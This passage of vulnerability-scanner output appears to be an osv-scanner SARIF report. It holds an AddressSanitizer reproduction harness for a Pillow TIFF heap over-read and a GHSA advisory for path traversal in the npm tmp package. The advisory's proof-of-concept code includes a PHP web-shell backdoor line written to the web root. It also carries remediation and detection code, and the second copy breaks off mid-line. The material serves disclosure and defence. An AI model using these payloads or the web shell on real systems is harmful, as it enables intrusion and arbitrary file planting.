struct.unpack_from(endian + \"HHI\", data, offset)\n\u003e         if tag != wanted:\n\u003e             continue\n\u003e         size = {1: 1, 2: 1, 3: 2, 4: 4, 7: 1}[kind] * length\n\u003e         start = offset + 8 if size \u003c= 4 else struct.unpack_from(endian + \"I\", data, offset + 8)[0]\n\u003e         if start + size \u003e len(data):\n\u003e             raise ValueError(\"truncated field\")\n\u003e         return kind, length, data[start:start + size], endian\n\u003e     return None\n\u003e \n\u003e \n\u003e def checked_image_module(package):\n\u003e     if (sys.implementation.name != \"cpython\" or sys.version_info[:2] != (3, 11)\n\u003e             or sys.platform != \"darwin\" or platform.machine() != \"arm64\"):\n\u003e         raise RuntimeError(\"requires macOS ARM64 CPython 3.11\")\n\u003e     for relative, expected in PACKAGE_PINS.items():\n\u003e         path = (package / relative).resolve(strict=True)\n\u003e         if not path.is_relative_to(package) or hashlib.sha256(path.read_bytes()).hexdigest() != expected:\n\u003e             raise RuntimeError(\"reviewed wheel file mismatch\")\n\u003e     process_symbols = ctypes.CDLL(None)\n\u003e     for symbol in (\"__asan_init\", \"__asan_address_is_poisoned\", \"__asan_region_is_poisoned\"):\n\u003e         getattr(process_symbols, symbol)\n\u003e     sys.path.insert(0, str(package))\n\u003e     from PIL import Image, features\n\u003e     if (Image.__version__ != \"12.3.0\" or features.version(\"libtiff\") != \"4.7.1\"\n\u003e             or Path(Image.__file__).resolve() != package / \"PIL/Image.py\"\n\u003e             or Path(Image.core.__file__).resolve() != package / \"PIL/_imaging.cpython-311-darwin.so\"):\n\u003e         raise RuntimeError(\"unexpected Pillow or libtiff\")\n\u003e     return Image\n\u003e \n\u003e \n\u003e def emit(descriptor, message):\n\u003e     os.write(descriptor, (json.dumps(message, sort_keys=True) + \"\\n\").encode(\"ascii\"))\n\u003e \n\u003e \n\u003e def child(case, package):\n\u003e     descriptor = os.dup(1)\n\u003e     with open(os.devnull, \"wb\") as quiet:\n\u003e         os.dup2(quiet.fileno(), 1)\n\u003e     try:\n\u003e         image_module = checked_image_module(package)\n\u003e         data = fixture(case)\n\u003e         with image_module.open(io.BytesIO(data)) as image:\n\u003e             image.load()\n\u003e             if image.size != (1, 1) or image.info.get(\"compression\") != \"packbits\":\n\u003e                 raise ValueError(\"unexpected input geometry\")\n\u003e             bits = 8 if case == \"colormap8\" else 16\n\u003e             if image.tag_v2[258] != (bits,):\n\u003e                 raise ValueError(\"unexpected sample width\")\n\u003e             if case == \"colormap_absent\":\n\u003e                 if 320 in image.tag_v2:\n\u003e                     raise ValueError(\"unexpected ColorMap\")\n\u003e             elif image.tag_v2[320] != (0,) * 768:\n\u003e                 raise ValueError(\"unexpected ColorMap planes\")\n\u003e             emit(descriptor, {\"ready\": True})\n\u003e             with io.BytesIO() as output:\n\u003e                 image.save(output, format=\"TIFF\")\n\u003e                 if case == \"colormap16\":\n\u003e                     emit(descriptor, {\"unsafe_save_returned\": True})\n\u003e                     return 1\n\u003e                 encoded = output.getvalue()\n\u003e                 saved_bits = field(encoded, 258)\n\u003e                 map_field = field(encoded, 320)\n\u003e                 bits_preserved = (saved_bits is not None and saved_bits[:2] == (3, 1)\n\u003e                                   and struct.unpack(saved_bits[3] + \"H\", saved_bits[2])[0] == bits)\n\u003e                 map_preserved = (map_field is None if case == \"colormap_absent\"\n\u003e                                  else map_field is not None and map_field[:2] == (3, 768)\n\u003e                                  and map_field[2] == bytes(1536))\n\u003e                 emit(descriptor, {\"control_passed\": bool(bits_preserved and map_preserved)})\n\u003e         return 0\n\u003e     except Exception:\n\u003e         emit(descriptor, {\"child_failed\": True})\n\u003e         return 2\n\u003e     finally:\n\u003e         os.close(descriptor)\n\u003e \n\u003e \n\u003e def run_case(case, package, runtime):\n\u003e     with tempfile.TemporaryDirectory(prefix=\"pillow-check-\") as temporary:\n\u003e         environment = {\n\u003e             \"PATH\": \"/usr/bin:/bin:/usr/sbin:/sbin\",\n\u003e             \"HOME\": temporary,\n\u003e             \"TMPDIR\": temporary,\n\u003e             \"LC_ALL\": \"C\",\n\u003e             \"DYLD_INSERT_LIBRARIES\": str(runtime),\n\u003e             \"ASAN_OPTIONS\": \"detect_leaks=0:halt_on_error=1:abort_on_error=0:exitcode=86:\"\n\u003e                             \"disable_coredump=1:symbolize=1:malloc_fill_byte=165:\"\n\u003e                             \"max_malloc_fill_size=1048576:log_path=stderr\",\n\u003e         }\n\u003e         command = [sys.executable, \"-I\", \"-S\", \"-B\", str(Path(__file__).resolve()),\n\u003e                    \"--package-path\", str(package), \"--asan-runtime\", str(runtime), \"--child\", case]\n\u003e         output = bytearray()\n\u003e         diagnostics = bytearray()\n\u003e         deadline = time.monotonic() + WALL_SECONDS\n\u003e         with subprocess.Popen(command, cwd=temporary, env=environment, stdin=subprocess.DEVNULL,\n\u003e                               stdout=subprocess.PIPE, stderr=subprocess.PIPE,\n\u003e                               preexec_fn=limits, start_new_session=True) as process:\n\u003e             bounded = True\n\u003e             try:\n\u003e                 with selectors.DefaultSelector() as selector:\n\u003e                     selector.register(process.stdout, selectors.EVENT_READ, output)\n\u003e                     selector.register(process.stderr, selectors.EVENT_READ, diagnostics)\n\u003e                     while selector.get_map():\n\u003e                         remaining = deadline - time.monotonic()\n\u003e                         if remaining \u003c= 0:\n\u003e                             raise TimeoutError\n\u003e                         for key, events in selector.select(min(remaining, 0.25)):\n\u003e                             chunk = os.read(key.fileobj.fileno(), 8192)\n\u003e                             if not chunk:\n\u003e                                 selector.unregister(key.fileobj)\n\u003e                             else:\n\u003e                                 key.data.extend(chunk)\n\u003e                                 if len(output) + len(diagnostics) \u003e PIPE_LIMIT:\n\u003e                                     raise BufferError\n\u003e                     process.wait(timeout=max(0.001, deadline - time.monotonic()))\n\u003e             except (TimeoutError, BufferError, subprocess.TimeoutExpired):\n\u003e                 bounded = False\n\u003e                 try:\n\u003e                     os.killpg(process.pid, 9)\n\u003e                 except ProcessLookupError:\n\u003e                     pass\n\u003e                 process.wait()\n\u003e             status = process.returncode\n\u003e         try:\n\u003e             messages = [json.loads(line) for line in output.splitlines()]\n\u003e         except (ValueError, UnicodeError):\n\u003e             messages = []\n\u003e         ready = bool(messages and messages[0] == {\"ready\": True})\n\u003e         if case == \"colormap16\":\n\u003e             observed = bool(bounded and ready and status == 86 and len(messages) == 1\n\u003e                             and b\"AddressSanitizer: heap-buffer-overflow\" in diagnostics\n\u003e                             and b\"READ of size 131072\" in diagnostics\n\u003e                             and b\"0 bytes after 1536-byte region\" in diagnostics\n\u003e                             and b\"PyImaging_LibTiffEncoderNew\" in diagnostics\n\u003e                             and b\"_TIFFmemcpy\" in diagnostics)\n\u003e         else:\n\u003e             observed = bool(bounded and ready and status == 0\n\u003e                             and messages == [{\"ready\": True}, {\"control_passed\": True}]\n\u003e                             and b\"AddressSanitizer:\" not in diagnostics)\n\u003e         output.clear()\n\u003e         diagnostics.clear()\n\u003e         return {\"case\": case, \"expected_observation\": observed, \"guard_passed\": ready,\n\u003e                 \"within_limits\": bounded}\n\u003e \n\u003e \n\u003e def main():\n\u003e     parser = argparse.ArgumentParser(description='Fixed ColorMap extent mismatch: controls first, ASAN-only trigger.')\n\u003e     parser.add_argument(\"--package-path\", required=True, type=Path,\n\u003e                         help=\"reviewed existing installation root containing PIL\")\n\u003e     parser.add_argument(\"--asan-runtime\", required=True, type=Path,\n\u003e                         help=\"reviewed existing compatible ASAN dylib; never loaded late\")\n\u003e     parser.add_argument(\"--child\", choices=CASES, help=argparse.SUPPRESS)\n\u003e     arguments = parser.parse_args()\n\u003e     if arguments.child:\n\u003e         limits()\n\u003e         return child(arguments.child, arguments.package_path.resolve())\n\u003e     try:\n\u003e         package = arguments.package_path.resolve(strict=True)\n\u003e         runtime = arguments.asan_runtime.resolve(strict=True)\n\u003e         if not package.is_dir() or not runtime.is_file():\n\u003e             raise ValueError(\"invalid existing paths\")\n\u003e         for case in CASES:\n\u003e             fixture(case)\n\u003e         results = [run_case(case, package, runtime) for case in CASES]\n\u003e     except Exception:\n\u003e         print(json.dumps({\"setup_failed\": True}))\n\u003e         return 2\n\u003e     for result in results:\n\u003e         print(json.dumps(result, sort_keys=True))\n\u003e     return 0 if all(result[\"expected_observation\"] for result in results) else 1\n\u003e \n\u003e \n\u003e if __name__ == \"__main__\":\n\u003e     raise SystemExit(main())\n\u003e ```\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-pchr-8j38-3x4p | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112896\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-112896",
              "name": "CVE-2026-112896",
              "properties": {
                "security-severity": "8.8"
              },
              "relationships": [],
              "shortDescription": {
                "markdown": "CVE-2026-112896: Pillow: TIFF encoder ColorMap plane-size mismatch causes a heap out-of-bounds read",
                "text": "CVE-2026-112896: Pillow: TIFF encoder ColorMap plane-size mismatch causes a heap out-of-bounds read"
              }
            },
            {
              "deprecatedIds": [
                "CVE-2026-44705",
                "GHSA-ph9p-34f9-6g65"
              ],
              "fullDescription": {
                "markdown": "### Summary\n\nThe tmp npm package contains a path traversal vulnerability that allows escaping the intended temporary directory when untrusted data flows into the `prefix`, `postfix`, or `dir` options. By embedding traversal sequences (e.g., `../`) or path separators in these parameters, attackers can cause files to be created outside the configured temporary base directory at attacker-controlled locations with the privileges of the running process. This vulnerability affects applications that pass user-controlled data to tmp's file/directory creation functions without proper input sanitization.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in tmp's path construction logic where user-supplied options are directly concatenated into file paths without sanitization or validation.\n\n**Technical Flow:**\n1. **Filename Construction:** tmp builds filenames as `\u003cprefix\u003e-\u003cpid\u003e-\u003crandom\u003e-\u003cpostfix\u003e`\n2. **Path Composition:** Final path computed as `path.join(tmpDir, opts.dir, name)`\n3. **Path Normalization:** Node.js `path.join()` normalizes traversal sequences, allowing escape\n4. **File Creation:** File created at the resulting (potentially escaped) path\n\n**Vulnerable Pattern:**\n```javascript\n// In tmp package internals\nconst name = `${opts.prefix || ''}-${process.pid}-${randomString}-${opts.postfix || ''}`;\nconst finalPath = path.join(tmpDir, opts.dir || '', name);\n// No validation that finalPath remains within tmpDir\n```\n\n**Path Traversal Mechanics:**\n- **prefix/postfix traversal:** `../../../evil` in prefix escapes directory structure\n- **Absolute path bypass:** If `opts.dir` is absolute, `path.join()` ignores `tmpDir` completely\n- **Normalization exploitation:** `path.join()` resolves `../` sequences regardless of surrounding text\n- **Cross-platform impact:** Works on Windows (`..\\\\`), Unix (`../`), and mixed path systems\n\n**Key Vulnerability Points:**\n- No input validation on `prefix`, `postfix`, or `dir` parameters\n- Direct use of user input in path construction\n- Reliance on `path.join()` normalization without containment checks\n- Missing post-construction validation that final path remains within intended directory\n\n### PoC\n\n**Basic Path Traversal via prefix:**\n```javascript\nconst tmp = require('tmp');\nconst path = require('path');\nconst fs = require('fs');\n\n// Create a controlled base directory\nconst baseDir = fs.mkdtempSync('/tmp/safe-base-');\nconsole.log('Base directory:', baseDir);\n\n// Escape via prefix\ntmp.file({ \n  tmpdir: baseDir, \n  prefix: '../escaped' \n}, (err, filepath, fd, cleanup) =\u003e {\n  if (err) throw err;\n  \n  console.log('Created file:', filepath);\n  console.log('Relative to base:', path.relative(baseDir, filepath));\n  // Output shows: ../escaped-\u003cpid\u003e-\u003crandom\u003e\n  \n  cleanup();\n});\n```\n\n**Directory Escape via postfix:**\n```javascript\ntmp.file({ \n  tmpdir: baseDir, \n  postfix: '/../../pwned.txt' \n}, (err, filepath, fd, cleanup) =\u003e {\n  if (err) throw err;\n  \n  console.log('Escaped file:', filepath);\n  console.log('Escaped outside base:', !filepath.startsWith(baseDir));\n  \n  cleanup();\n});\n```\n\n**Absolute Path Bypass via dir:**\n```javascript\ntmp.file({ \n  tmpdir: '/safe/tmp/dir', \n  dir: '/tmp/evil-location',\n  prefix: 'bypassed'\n}, (err, filepath, fd, cleanup) =\u003e {\n  if (err) throw err;\n  \n  console.log('Bypassed to:', filepath);\n  // File created in /tmp/evil-location instead of /safe/tmp/dir\n  \n  cleanup();\n});\n```\n\n**Advanced Multi-Vector Attack:**\n```javascript\nconst maliciousOpts = {\n  tmpdir: '/app/safe-tmp',\n  dir: '../../../tmp',           // Escape base\n  prefix: '../sensitive-area/',   // Further traversal\n  postfix: 'malicious.config'     // Controlled filename\n};\n\ntmp.file(maliciousOpts, (err, filepath, fd, cleanup) =\u003e {\n  // Results in file creation at: /tmp/sensitive-area/malicious.config\n  console.log('Final malicious path:', filepath);\n  cleanup();\n});\n```\n\n**Real-World Attack Simulation:**\n```javascript\n// Simulate web API that accepts user file prefix\nfunction createUserTempFile(userPrefix, content) {\n  return new Promise((resolve, reject) =\u003e {\n    tmp.file({ prefix: userPrefix }, (err, path, fd, cleanup) =\u003e {\n      if (err) return reject(err);\n      \n      fs.writeSync(fd, content);\n      console.log('User file created at:', path);\n      resolve({ path, cleanup });\n    });\n  });\n}\n\n// Attacker input\nconst attackerPrefix = '../../../var/www/html/backdoor';\ncreateUserTempFile(attackerPrefix, '\u003c?php system($_GET[\"cmd\"]); ?\u003e');\n// Creates PHP backdoor in web root instead of temp directory\n```\n\n### Impact\n\n**Arbitrary File Creation:**\n- Files created outside intended temporary directories\n- Attacker control over file placement location\n- Potential to overwrite existing files (depending on creation flags)\n- Cross-platform exploitation capability\n\n**Attack Scenarios:**\n\n**1. Web Application Configuration Poisoning:**\n- User uploads file with malicious prefix/postfix\n- tmp creates \"temporary\" file in application configuration directory\n- Malicious configuration loaded on next application restart\n\n**2. Cache Poisoning:**\n- Application caches user content using tmp\n- Attacker escapes to cache directory of different user/tenant\n- Poisoned cache serves malicious content to other users\n\n**3. Build Pipeline Compromise:**\n- CI/CD system processes user PRs with tmp usage\n- Malicious prefix escapes to build output directories\n- Compromised build artifacts deployed to production\n\n**4. Container Escape Attempt:**\n- Containerized application uses tmp with user input\n- Attacker attempts to escape container temp restrictions\n- Files created in host-mapped volumes or sensitive container areas\n\n**5. Multi-Tenant Service Bypass:**\n- SaaS platform isolates tenants using separate tmp directories\n- Tenant A escapes their tmp space to tenant B's area\n- Cross-tenant data access and potential privilege escalation\n\n**Business Impact:**\n- **Data Integrity:** Unauthorized file placement can corrupt application state\n- **Service Disruption:** Files in wrong locations may break application functionality  \n- **Security Bypass:** Escape temporary isolation boundaries\n- **Compliance Violations:** Files containing sensitive data placed in uncontrolled locations\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** tmp\n- **Repository:** github.com/raszi/node-tmp\n- **Affected versions:** All versions with vulnerable path construction logic\n- **Patched versions:** None currently available\n\n**Component Impact:**\n- `tmp.file()` function - vulnerable to prefix/postfix/dir traversal\n- `tmp.dir()` function - vulnerable to same parameter manipulation  \n- `tmp.tmpName()` function - if using affected path construction\n\n**Severity:** High  \n**CVSS v3.1:** 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L)\n\n**CWE Classification:**\n- CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)\n\n### Remediation\n\n**Input Validation and Sanitization:**\n\n1. **Sanitize prefix/postfix:**\n```javascript\nfunction sanitizePrefix(prefix) {\n  if (!prefix) return '';\n  // Remove path separators and traversal sequences\n  return path.basename(String(prefix)).replace(/[\\.\\/\\\\]/g, '-');\n}\n\nfunction sanitizePostfix(postfix) {\n  if (!postfix) return '';\n  // Allow only safe characters\n  return String(postfix).replace(/[^A-Za-z0-9._-]/g, '');\n}\n```\n\n2. **Validate dir parameter:**\n```javascript\nfunction validateDir(dir, baseDir) {\n  if (!dir) return '';\n  \n  // Reject absolute paths\n  if (path.isAbsolute(dir)) {\n    throw new Error('Absolute paths not allowed for dir option');\n  }\n  \n  // Resolve and check containment\n  const resolved = path.resolve(baseDir, dir);\n  const relative = path.relative(baseDir, resolved);\n  \n  if (relative.startsWith('..') || path.isAbsolute(relative)) {\n    throw new Error('Dir option escapes base directory');\n  }\n  \n  return dir;\n}\n```\n\n3. **Post-construction path validation:**\n```javascript\nfunction validateFinalPath(finalPath, baseDir) {\n  const resolved = path.resolve(finalPath);\n  const relative = path.relative(path.resolve(baseDir), resolved);\n  \n  if (relative.startsWith('..') || path.isAbsolute(relative)) {\n    throw new Error('Generated path escapes temporary directory');\n  }\n  \n  return resolved;\n}\n```\n\n**Secure Implementation Pattern:**\n```javascript\nfunction createTempFile(options) {\n  const opts = { ...options };\n  \n  // Sanitize inputs\n  opts.prefix = sanitizePrefix(opts.prefix);\n  opts.postfix = sanitizePostfix(opts.postfix);\n  opts.dir = validateDir(opts.dir, opts.tmpdir);\n  \n  // Create with sanitized options\n  return tmp.file(opts, (err, path, fd, cleanup) =\u003e {\n    if (err) return callback(err);\n    \n    // Validate final path\n    try {\n      validateFinalPath(path, opts.tmpdir);\n    } catch (validationErr) {\n      cleanup();\n      return callback(validationErr);\n    }\n    \n    callback(null, path, fd, cleanup);\n  });\n}\n```\n\n### Workarounds\n\n**For Application Developers:**\n\n1. **Input Sanitization:**\n```javascript\n// Sanitize before passing to tmp\nfunction safeTmpFile(userOptions) {\n  const safeOpts = {\n    ...userOptions,\n    prefix: userOptions.prefix ? path.basename(userOptions.prefix) : undefined,\n    postfix: userOptions.postfix ? userOptions.postfix.replace(/[^A-Za-z0-9._-]/g, '') : undefined,\n    dir: undefined // Don't allow user-controlled dir\n  };\n  \n  return tmp.file(safeOpts);\n}\n```\n\n2. **Path Validation:**\n```javascript\nfunction validateTmpPath(tmpPath, expectedBase) {\n  const relativePath = path.relative(expectedBase, tmpPath);\n  if (relativePath.startsWith('..') || path.isAbsolute(relativePath)) {\n    throw new Error('Temporary file path escaped base directory');\n  }\n  return tmpPath;\n}\n```\n\n3. **Restricted Usage:**\n```javascript\n// Only use tmp with known-safe, literal values\ntmp.file({ prefix: 'app-temp-', postfix: '.tmp' }, callback);\n// Never: tmp.file({ prefix: userInput }, callback);\n```\n\n**For Security Teams:**\n\n1. **Code Review Patterns:**\n```bash\n# Search for dangerous tmp usage\ngrep -r \"tmp\\.file.*prefix.*req\\|tmp\\.file.*postfix.*req\" .\ngrep -r \"tmp\\.dir.*opts\\|tmp\\.file.*opts\" .\n```\n\n2. **Runtime Monitoring:**\n```javascript\n// Monitor for files created outside expected temp areas\nconst originalFile = tmp.file;\ntmp.file = function(options, callback) {\n  return originalFile(options, (err, path, fd, cleanup) =\u003e {\n    if (!err \u0026\u0026 options.tmpdir) {\n      const relative = require('path').relative(options.tmpdir, path);\n      if (relative.startsWith('..')) {\n        console.warn('Path traversal detected:', path);\n      }\n    }\n    return callback(err, path, fd, cleanup);\n  });\n};\n```\n\n### Detection and Monitoring\n\n**Static Analysis:**\n- Scan for tmp usage with user-controlled input\n- Identify unsanitized parameter passing to tmp functions\n- Review file creation patterns in temporary directories\n\n**Runtime Detection:**\n```javascript\n// Log suspicious tmp operations\nfunction monitorTmpUsage() {\n  const originalTmpFile = require('tmp').file;\n  \n  require('tmp').file = function(options = {}, callback) {\n    // Check for suspicious patterns\n    const suspicious = [\n      options.prefix \u0026\u0026 options.prefix.includes('..'),\n      options.postfix \u0026\u0026 options.postfix.includes('..'),  \n      options.dir \u0026\u0026 path.isAbsolute(options.dir)\n    ].some(Boolean);\n    \n    if (suspicious) {\n      console.warn('Suspicious tmp usage detected:', options);\n    }\n    \n    return originalTmpFile.call(this, options, callback);\n  };\n}\n```\n\n**File System Monitoring:**\n```bash\n# Monitor file creation outside expected temp directories\ninotifywait -m -r --format '%w%f %e' /tmp /var/tmp | while read file event; do\n  if [[ \"$event\" == *\"CREATE\"* \u0026\u0026 \"$file\" != /tmp/tmp-* ]]; then\n    echo \"Unexpected file creation: $file\"\n  fi\ndone\n```\n### Acknowledgements\n\n**Reported by**: Mapta / BugBunny_ai",
                "text": "### Summary\n\nThe tmp npm package contains a path traversal vulnerability that allows escaping the intended temporary directory when untrusted data flows into the `prefix`, `postfix`, or `dir` options. By embedding traversal sequences (e.g., `../`) or path separators in these parameters, attackers can cause files to be created outside the configured temporary base directory at attacker-controlled locations with the privileges of the running process. This vulnerability affects applications that pass user-controlled data to tmp's file/directory creation functions without proper input sanitization.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in tmp's path construction logic where user-supplied options are directly concatenated into file paths without sanitization or validation.\n\n**Technical Flow:**\n1. **Filename Construction:** tmp builds filenames as `\u003cprefix\u003e-\u003cpid\u003e-\u003crandom\u003e-\u003cpostfix\u003e`\n2. **Path Composition:** Final path computed as `path.join(tmpDir, opts.dir, name)`\n3. **Path Normalization:** Node.js `path.join()` normalizes traversal sequences, allowing escape\n4. **File Creation:** File created at the resulting (potentially escaped) path\n\n**Vulnerable Pattern:**\n```javascript\n// In tmp package internals\nconst name = `${opts.prefix || ''}-${process.pid}-${randomString}-${opts.postfix || ''}`;\nconst finalPath = path.join(tmpDir, opts.dir || '', name);\n// No validation that finalPath remains within tmpDir\n```\n\n**Path Traversal Mechanics:**\n- **prefix/postfix traversal:** `../../../evil` in prefix escapes directory structure\n- **Absolute path bypass:** If `opts.dir` is absolute, `path.join()` ignores `tmpDir` completely\n- **Normalization exploitation:** `path.join()` resolves `../` sequences regardless of surrounding text\n- **Cross-platform impact:** Works on Windows (`..\\\\`), Unix (`../`), and mixed path systems\n\n**Key Vulnerability Points:**\n- No input validation on `prefix`, `postfix`, or `dir` parameters\n- Direct use of user input in path construction\n- Reliance on `path.join()` normalization without containment checks\n- Missing post-construction validation that final path remains within intended directory\n\n### PoC\n\n**Basic Path Traversal via prefix:**\n```javascript\nconst tmp = require('tmp');\nconst path = require('path');\nconst fs = require('fs');\n\n// Create a controlled base directory\nconst baseDir = fs.mkdtempSync('/tmp/safe-base-');\nconsole.log('Base directory:', baseDir);\n\n// Escape via prefix\ntmp.file({ \n  tmpdir: baseDir, \n  prefix: '../escaped' \n}, (err, filepath, fd, cleanup) =\u003e {\n  if (err) throw err;\n  \n  console.log('Created file:', filepath);\n  console.log('Relative to base:', path.relative(baseDir, filepath));\n  // Output shows: ../escaped-\u003cpid\u003e-\u003crandom\u003e\n  \n  cleanup();\n});\n```\n\n**Directory Escape via postfix:**\n```javascript\ntmp.file({ \n  tmpdir: baseDir, \n  postfix: '/../../pwned.txt' \n}, (err, filepath, fd, cleanup) =\u003e {\n  if (err) throw err;\n  \n  console.log('Escaped file:', filepath);\n  console.log('Escaped outside base:', !filepath.startsWith(baseDir));\n  \n  cleanup();\n});\n```\n\n**Absolute Path Bypass via dir:**\n```javascript\ntmp.file({ \n  tmpdir: '/safe/tmp/dir', \n  dir: '/tmp/evil-location',\n  prefix: 'bypassed'\n}, (err, filepath, fd, cleanup) =\u003e {\n  if (err) throw err;\n  \n  console.log('Bypassed to:', filepath);\n  // File created in /tmp/evil-location instead of /safe/tmp/dir\n  \n  cleanup();\n});\n```\n\n**Advanced Multi-Vector Attack:**\n```javascript\nconst maliciousOpts = {\n  tmpdir: '/app/safe-tmp',\n  dir: '../../../tmp',           // Escape base\n  prefix: '../sensitive-area/',   // Further traversal\n  postfix: 'malicious.config'     // Controlled filename\n};\n\ntmp.file(maliciousOpts, (err, filepath, fd, cleanup) =\u003e {\n  // Results in file creation at: /tmp/sensitive-area/malicious.config\n  console.log('Final malicious path:', filepath);\n  cleanup();\n});\n```\n\n**Real-World Attack Simulation:**\n```javascript\n// Simulate web API that accepts user file prefix\nfunction createUserTempFile(userPrefix, content) {\n  return new Promise((resolve, reject) =\u003e {\n    tmp.file({ prefix: userPrefix }, (err, path, fd, cleanup) =\u003e {\n      if (err) return reject(err);\n      \n      fs.writeSync(fd, content);\n      console.log('User file created at:', path);\n      resolve({ path, cleanup });\n    });\n  });\n}\n\n// Attacker input\nconst attackerPrefix = '../../../var/www/html/backdoor';\ncreateUserTempFile(attackerPrefix, '\u003c?php system($_GET[\"cmd\"]); ?\u003e');\n// Creates PHP backdoor in web root instead of temp directory\n```\n\n### Impact\n\n**Arbitrary File Creation:**\n- Files created outside intended temporary directories\n- Attacker control over file placement location\n- Potential to overwrite existing files (depending on creation flags)\n- Cross-platform exploitation capability\n\n**Attack Scenarios:**\n\n**1. Web Application Configuration Poisoning:**\n- User uploads file with malicious prefix/postfix\n- tmp creates \"temporary\" file in application configuration directory\n- Malicious configuration loaded on next application restart\n\n**2. Cache Poisoning:**\n- Application caches user content using tmp\n- Attacker escapes to cache directory of different user/tenant\n- Poisoned cache serves malicious content to other users\n\n**3. Build Pipeline Compromise:**\n- CI/CD system processes user PRs with tmp usage\n- Malicious prefix escapes to build output directories\n- Compromised build artifacts deployed to production\n\n**4. Container Escape Attempt:**\n- Containerized application uses tmp with user input\n- Attacker attempts to escape container temp restrictions\n- Files created in host-mapped volumes or sensitive container areas\n\n**5. Multi-Tenant Service Bypass:**\n- SaaS platform isolates tenants using separate tmp directories\n- Tenant A escapes their tmp space to tenant B's area\n- Cross-tenant data access and potential privilege escalation\n\n**Business Impact:**\n- **Data Integrity:** Unauthorized file placement can corrupt application state\n- **Service Disruption:** Files in wrong locations may break application functionality  \n- **Security Bypass:** Escape temporary isolation boundaries\n- **Compliance Violations:** Files containing sensitive data placed in uncontrolled locations\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** tmp\n- **Repository:** github.com/raszi/node-tmp\n- **Affected versions:** All versions with vulnerable path construction logic\n- **Patched versions:** None currently available\n\n**Component Impact:**\n- `tmp.file()` function - vulnerable to prefix/postfix/dir traversal\n- `tmp.dir()` function - vulnerable to same parameter manipulation  \n- `tmp.tmpName()` function - if using affected path construction\n\n**Severity:** High  \n**CVSS v3.1:** 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L)\n\n**CWE Classification:**\n- CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)\n\n### Remediation\n\n**Input Validation and Sanitization:**\n\n1. **Sanitize prefix/postfix:**\n```javascript\nfunction sanitizePrefix(prefix) {\n  if (!prefix) return '';\n  // Remove path separators and traversal sequences\n  return path.basename(String(prefix)).replace(/[\\.\\/\\\\]/g, '-');\n}\n\nfunction sanitizePostfix(postfix) {\n  if (!postfix) return '';\n  // Allow only safe characters\n  return String(postfix).replace(/[^A-Za-z0-9._-]/g, '');\n}\n```\n\n2. **Validate dir parameter:**\n```javascript\nfunction validateDir(dir, baseDir) {\n  if (!dir) return '';\n  \n  // Reject absolute paths\n  if (path.isAbsolute(dir)) {\n    throw new Error('Absolute paths not allowed for dir option');\n  }\n  \n  // Resolve and check containment\n  const resolved = path.resolve(baseDir, dir);\n  const relative = path.relative(baseDir, resolved);\n  \n  if (relative.startsWith('..') || path.isAbsolute(relative)) {\n    throw new Error('Dir option escapes base directory');\n  }\n  \n  return dir;\n}\n```\n\n3. **Post-construction path validation:**\n```javascript\nfunction validateFinalPath(finalPath, baseDir) {\n  const resolved = path.resolve(finalPath);\n  const relative = path.relative(path.resolve(baseDir), resolved);\n  \n  if (relative.startsWith('..') || path.isAbsolute(relative)) {\n    throw new Error('Generated path escapes temporary directory');\n  }\n  \n  return resolved;\n}\n```\n\n**Secure Implementation Pattern:**\n```javascript\nfunction createTempFile(options) {\n  const opts = { ...options };\n  \n  // Sanitize inputs\n  opts.prefix = sanitizePrefix(opts.prefix);\n  opts.postfix = sanitizePostfix(opts.postfix);\n  opts.dir = validateDir(opts.dir, opts.tmpdir);\n  \n  // Create with sanitized options\n  return tmp.file(opts, (err, path, fd, cleanup) =\u003e {\n    if (err) return callback(err);\n    \n    // Validate final path\n    try {\n      validateFinalPath(path, opts.tmpdir);\n    } catch (validationErr) {\n      cleanup();\n      return callback(validationErr);\n    }\n    \n    callback(null, path, fd, cleanup);\n  });\n}\n```\n\n### Workarounds\n\n**For Application Developers:**\n\n1. **Input Sanitization:**\n```javascript\n// Sanitize before passing to tmp\nfunction safeTmpFile(userOptions) {\n  const safeOpts = {\n    ...userOptions,\n    prefix: userOptions.prefix ? path.basename(userOptions.prefix) : undefined,\n    postfix: userOptions.postfix ? userOptions.postfix.replace(/[^A-Za-z0-9._-]/g, '') : undefined,\n    dir: undefined // Don't allow user-controlled dir\n  };\n  \n  return tmp.file(safeOpts);\n}\n```\n\n2. **Path Validation:**\n```javascript\nfunction validateTmpPath(tmpPath, expectedBase) {\n  const relativePath = path.relative(expectedBase, tmpPath);\n  if (relativePath.startsWith('..') || path.isAbsolute(relativePath)) {\n    throw new Error('Temporary file path escaped base directory');\n  }\n  return tmpPath;\n}\n```\n\n3. **Restricted Usage:**\n```javascript\n// Only use tmp with known-safe, literal values\ntmp.file({ prefix: 'app-temp-', postfix: '.tmp' }, callback);\n// Never: tmp.file({ prefix: userInput }, callback);\n```\n\n**For Security Teams:**\n\n1. **Code Review Patterns:**\n```bash\n# Search for dangerous tmp usage\ngrep -r \"tmp\\.file.*prefix.*req\\|tmp\\.file.*postfix.*req\" .\ngrep -r \"tmp\\.dir.*opts\\|tmp\\.file.*opts\" .\n```\n\n2. **Runtime Monitoring:**\n```javascript\n// Monitor for files created outside expected temp areas\nconst originalFile = tmp.file;\ntmp.file = 